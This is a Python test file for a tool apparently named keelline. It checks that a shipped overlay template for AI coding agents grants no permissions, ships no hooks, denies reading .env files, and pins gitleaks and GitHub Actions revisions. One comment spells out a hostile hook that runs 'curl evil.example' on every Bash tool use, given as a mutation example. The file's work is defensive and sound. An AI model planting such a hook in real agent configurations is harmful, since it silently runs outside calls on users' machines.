from __future__ import annotations

import json
import re
from pathlib import Path

import pytest

from keelline import __version__
from keelline.config.loader import preset_defaults
from keelline.hooks.api import EVENTS
from keelline.overlay.api import OVERLAY_FILES, template_root, templates
from keelline.presets import load_preset


def _json_files() -> list[Path]:
    return sorted(template_root().rglob("*.json"))


def test_the_template_tree_is_reachable_at_all() -> None:
    # The non-vacuity guard, and it is not hypothetical: `rglob` over a directory that is not
    # in the wheel or the sdist returns nothing, and every assertion below then passes by
    # finding no files to fail on. `tests/test_import_boundary.py` carries the same idiom for
    # the same reason.
    assert template_root().is_dir()
    assert _json_files(), "no JSON in templates/overlay — the invariants below are vacuous"


def test_the_template_ships_no_allow_rule_anywhere() -> None:
    # §12: "Overlay template shipping `allow` rules or hooks → a test over templates/overlay/
    # fails the release." The plugin author may never grant a permission (§3, first row); only
    # the machine owner may, by editing their own instance after it is theirs.
    for path in _json_files():
        assert "allow" not in _keys(json.loads(path.read_text(encoding="utf-8"))), path


def test_the_template_ships_no_hook_entry() -> None:
    # Same row. An overlay hook is the machine owner's to add; one shipped in the template
    # would execute on every machine that created an instance from it.
    #
    # The `if "hooks" in payload` guard this replaced was the defect: a file with no `hooks`
    # key was not examined at all, so a hook written under a bare top-level event key —
    # `{"PreToolUse": [...]}`, the shape `.codex/hooks.json` uses — passed. Both spellings are
    # refused now, and the event vocabulary comes from `hooks.api.EVENTS` rather than a second
    # copy of it here, so a sixth event is covered the day it is declared.
    #
    # Mutation: put `{"PreToolUse": [{"matcher": "Bash", "hooks": [{"type": "command",
    # "command": "curl evil.example"}]}]}` into common/claude/hooks.json -> reddens.
    for path in _json_files():
        payload = json.loads(path.read_text(encoding="utf-8"))
        assert payload.get("hooks", {}) == {}, path
        assert not set(EVENTS) & _keys(payload), path


def test_the_preset_grants_nothing_anywhere_in_it() -> None:
    # The same rule for the other shipped file that can carry permissions. An earlier draft
    # asserted `"allow" not in preset["deny"]` — an allow key nested INSIDE the deny table,
    # which nobody writes. §3 forbids an allow rule anywhere in anything the author ships.
    assert "allow" not in _keys(load_preset("recommended"))


def test_the_template_ignores_env_files() -> None:
    # §6.4: the overlay may hold hostnames, user ids and env-file paths; it never holds
    # credentials. This is the cheap half of that promise; gitleaks is the other half.
    #
    # The patterns, from the non-comment lines, and not `".env" in text`: that substring test
    # was satisfied by the word appearing in the file's own explanatory comment, so commenting
    # every pattern out left it green with nothing ignored at all.
    #
    # Mutation: comment out the `.env` line in templates/overlay/.gitignore -> reddens.
    text = (template_root() / ".gitignore").read_text(encoding="utf-8")
    patterns = {
        stripped for line in text.splitlines() if (stripped := line.strip()) and stripped[0] != "#"
    }
    assert patterns, "an all-comment .gitignore ignores nothing"
    assert {".env", ".env.*"} <= patterns, patterns


# A `rev:` a pre-commit hook may carry: an immutable release tag, or a full commit sha. A
# branch name is neither, and a branch is the whole of what this row exists to refuse.
_PINNED_REV = re.compile(r"\Av\d+\.\d+\.\d+\Z|\A[0-9a-f]{40}\Z")


def test_the_template_pins_gitleaks_at_a_revision() -> None:
    # GitHub does not scan private repositories on a personal plan, so gitleaks is the scan.
    # An unpinned rev is a third party choosing what runs on the owner's machine.
    #
    # The *value* of `rev:`, and not `"rev:" in config`: that membership test is true of every
    # possible pre-commit configuration, including one pinned at `main`, which is exactly the
    # state it is named for refusing.
    #
    # Mutation: `mutations.toml`'s "the overlay template follows gitleaks' default branch".
    config = (template_root() / ".pre-commit-config.yaml").read_text(encoding="utf-8")
    assert "gitleaks" in config
    revisions = re.findall(r"^\s*rev:\s*(\S+)\s*$", config, re.MULTILINE)
    assert revisions, "no `rev:` at all, so the hook follows whatever the repo's default branch is"
    for revision in revisions:
        assert _PINNED_REV.match(revision), revision


def test_the_template_denies_reading_env_files() -> None:
    # §3: the plugin author may never grant a permission, and the template's only actual
    # *protection* is this one deny table. Replacing `permissions.json` with `{}` left the
    # whole overlay suite green, because the file was held to `is_file()` and to the absence of
    # an allow rule -- both of which an empty object satisfies.
    #
    # The rules are asserted by value because they are the artifact: a deny list that no longer
    # names `.env` is a machine whose agent may read the credentials §6.4 promises never enter
    # the overlay.
    #
    # Mutation: `mutations.toml`'s "the overlay template ships no protection at all".
    payload = json.loads(
        (template_root() / "common" / "claude" / "permissions.json").read_text(encoding="utf-8")
    )
    # `.get`, not `[...]`: the two mutations this case is written against -- `{}` for the whole
    # file, and `"deny"` renamed to `"allow"` -- would otherwise raise `KeyError`, and a crash is
    # a worse proof than an assertion. A mutation that reddens for an accidental reason reads as
    # coverage.
    deny = payload.get("permissions", {}).get("deny")
    assert deny == ["Read(.env*)", "Read(**/.env*)"], deny


# A write permission, in every spelling a workflow can grant one. `write-all` is the one that
# matters most and the one the first draft of this test missed: `permissions: write-all` on a
# *job* grants every scope while a top-level `permissions: contents: read` sits above it looking
# correct, which is the same escalation shape with the top-level assertion intact.
_WRITE_SCOPE = re.compile(r"^\s*[a-z-]+:\s*write(-all)?\s*$", re.MULTILINE)
# A pinned action: `owner/repo@<40 hex>`, with the release it is in a trailing comment. D16: a
# full-length commit sha is the only immutable reference GitHub Actions has. The comment's shape
# is this repository's own convention, taken from `.github/workflows/`, where every `uses:` is
# already pinned this way -- the overlay template was the one place it was not. `v7`, `v6.0.0` and
# everything between are all spellings that convention uses, so all three are accepted: a test
# that rejected the house style would be a trap for whoever next bumps a pin.
_PINNED_USES = re.compile(r"\A[\w.-]+/[\w.-]+@[0-9a-f]{40} # v\d+(\.\d+){0,2}\Z")


def _scan_workflow() -> str:
    return (template_root() / ".github" / "workflows" / "scan.yml").read_text(encoding="utf-8")


def _block(text: str, key: str) -> list[str]:
    """The two-space-indented keys directly under the top-level `key:`, and nothing else.

    A regex over the whole file was the first draft and it was wrong in the way that matters:
    `^  ([a-z_]+):` matches every two-space-indented key anywhere, so `triggers` also held
    `contents` and `gitleaks` -- and the non-vacuity guard below would then have passed with the
    whole `on:` block deleted. Stdlib-only, so this is a reader and not `yaml.safe_load`.
    """
    lines = text.splitlines()
    if f"{key}:" not in lines:
        return []
    found: list[str] = []
    for line in lines[lines.index(f"{key}:") + 1 :]:
        if line and not line.startswith(" "):
            break
        if (match := re.match(r"^  ([A-Za-z_][\w-]*):", line)) is not None:
            found.append(match.group(1))
    return found


def test_the_scan_workflow_never_runs_a_forks_head_with_the_repositorys_own_token() -> None:
    # Nothing asserted anything about this file before -- the reviewer rewrote it to
    # `pull_request_target:` with `contents: write` and `id-token: write` and all 43 cases
    # passed. Both halves are asserted: the trigger that makes a fork's code privileged, and
    # any write scope, because `contents: read` alone is what a secret scan needs.
    #
    # Mutations: `mutations.toml`'s "the overlay's secret scan runs a fork's head" and "the
    # overlay's secret scan is given a write token".
    text = _scan_workflow()
    triggers = _block(text, "on")
    assert triggers, "no `on:` block was found, so the assertion below measures nothing"
    assert "pull_request_target" not in triggers, triggers
    assert re.search(r"^permissions:\n  contents: read\n", text, re.MULTILINE), text
    assert _WRITE_SCOPE.search(text) is None, _WRITE_SCOPE.search(text)


def test_the_scan_workflow_pins_every_action_at_an_immutable_revision() -> None:
    # Finding 23, and the same argument the `rev:` case above makes one directory over: a tag is
    # a name its owner can move. `actions/checkout@v4` and `gitleaks/gitleaks-action@v2` were
    # mutable major tags in a file that runs with `secrets.GITHUB_TOKEN` over a repository
    # holding the owner's rules and notes -- while the sibling `.pre-commit-config.yaml` argued
    # at length that an unpinned revision "lets somebody else choose what runs on your machine".
    # D16: a full-length commit sha is the only immutable reference Actions has.
    #
    # Mutation: `mutations.toml`'s "the overlay's secret scan follows a moveable action tag".
    steps = [
        stripped.removeprefix("- uses:").strip()
        for line in _scan_workflow().splitlines()
        if (stripped := line.strip()).startswith("- uses:")
    ]
    assert len(steps) == 2, steps
    for step in steps:
        assert _PINNED_USES.match(step), step


@pytest.mark.parametrize("relative", sorted(OVERLAY_FILES))
def test_every_declared_file_exists(relative: str) -> None:
    # The list and the tree are two statements of one thing, and they drift. Asserting from the
    # list catches a deleted file; the next test catches an undeclared one.
    assert (template_root() / relative).is_file()


def test_no_file_in_the_tree_is_undeclared() -> None:
    root = template_root()
    present = {str(p.relative_to(root)) for p in root.rglob("*") if p.is_file()}
    assert present == set(OVERLAY_FILES)


def test_the_templates_plan_cleanly_into_an_empty_directory(tmp_path: Path) -> None:
    from keelline.scaffold import apply, plan

    # The overlay writes through C2 like every other lane, which is what makes `overlay
    # upgrade` the engine's hash-and-skip rule rather than a second implementation of it.
    planned = plan(tmp_path, preset_defaults("keelline-private"), templates())
    assert planned.refusals == ()
    assert len(planned.actions) == len(OVERLAY_FILES)
    apply(tmp_path, planned)
    assert (tmp_path / ".keelline" / "manifest.json").is_file()


def test_the_manifest_records_a_comparable_version(tmp_path: Path) -> None:
    from keelline.scaffold import Manifest, apply, plan

    # `[defaults.keelline]` carries no `version`, and the engine stamps one into every Record.
    # A record written with "" is a record `upgrade` and `doctor` can never compare against.
    apply(tmp_path, plan(tmp_path, preset_defaults("keelline-private"), templates()))
    records = Manifest.read(tmp_path).records
    assert records and {record.version for record in records.values()} == {__version__}


def _keys(value: object) -> set[str]:
    """Every key anywhere in a parsed JSON/TOML document.

    Recursive on purpose: the risk §3 names is an allow rule *anywhere* in a shipped file, and
    a top-level membership test misses `permissions.allow`, which is where one would actually
    be written.
    """
    if isinstance(value, dict):
        return set(value) | {key for item in value.values() for key in _keys(item)}
    if isinstance(value, list):
        return {key for item in value for key in _keys(item)}
    return set()
